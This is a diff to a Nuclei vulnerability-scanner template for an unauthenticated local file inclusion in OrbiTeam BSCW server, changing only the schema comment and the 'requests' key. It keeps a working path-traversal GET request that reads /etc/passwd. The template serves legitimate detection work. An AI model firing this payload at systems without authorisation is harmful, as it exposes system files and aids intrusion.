@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: orbiteam-bscw-server-lfi
 
 info:
@@ -14,7 +15,7 @@ info:
     cwe-id: CWE-22
   tags: bscw,orbiteam,lfi,unauth
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd"
